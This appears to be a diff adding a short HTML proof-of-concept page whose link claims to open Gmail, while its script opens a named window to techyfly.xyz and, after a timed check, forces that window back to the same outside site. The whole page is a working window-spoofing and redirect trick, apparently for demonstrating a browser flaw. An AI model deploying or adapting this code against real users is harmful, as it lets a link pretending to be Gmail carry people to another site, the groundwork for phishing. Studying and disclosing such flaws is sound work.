@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Url</title>
+</head>
+<body>
+    <a href="javascript:window.open('https://www.gmail.com/','x');" onclick="startSpoof()">Click here to Open Gmail</a>
+    <script>
+        let windowSpoof;
+        function race() {
+          try {
+            windowSpoof.location.href !== 'about:blank';
+          }
+          catch (e) {
+            windowSpoof.location.href='https://techyfly.xyz';
+          }
+        }
+        
+        function startSpoof() {
+          windowSpoof = window.open("https://techyfly.xyz/","x");
+          setTimeout('race()', 7000);
+        }
+        </script>
+</body>
+</html>
